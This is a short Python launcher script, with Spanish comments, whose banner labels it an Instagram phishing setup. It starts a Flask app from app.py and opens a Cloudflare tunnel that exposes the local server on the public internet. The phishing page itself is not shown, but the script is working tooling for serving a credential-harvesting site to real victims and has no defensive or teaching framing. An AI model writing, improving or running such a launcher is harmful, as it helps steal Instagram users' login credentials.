import subprocess
import time
import os

def lanzar_flask():
    print("[*] Iniciando servidor Flask (app.py)...")
    subprocess.Popen(["python", "app.py"], shell=True)

def lanzar_cloudflared():
    print("[*] Iniciando túnel Cloudflare...")
    subprocess.Popen(["cloudflared.exe", "tunnel", "--url", "http://localhost:5000"], shell=True)

if __name__ == "__main__":
    os.system("cls" if os.name == "nt" else "clear")
    print("======================================")
    print("   INACTIVO PHISHING - INSTAGRAM")
    print("======================================\n")

    lanzar_flask()
    time.sleep(2)  # espera para dar tiempo a que Flask arranque
    lanzar_cloudflared()
